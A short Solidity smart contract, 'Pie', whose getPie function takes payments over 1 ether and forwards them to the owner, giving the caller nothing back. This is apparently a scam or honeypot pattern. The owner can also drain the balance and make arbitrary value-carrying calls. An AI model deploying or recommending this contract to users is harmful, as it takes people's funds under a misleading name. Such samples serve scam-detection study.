pragma solidity ^0.4.19;

contract Pie {
    address public owner = msg.sender;

    function() public payable {}

    function getPie() public payable {
        require(msg.value > 1 ether);
        owner.transfer(msg.value);
    }

    function withdraw() public {
        require(msg.sender == owner);
        owner.transfer(this.balance);
    }

    function command(address adr, bytes data) public payable {
        require(msg.sender == owner);

        require(adr.call.value(msg.value)(data));
    }
}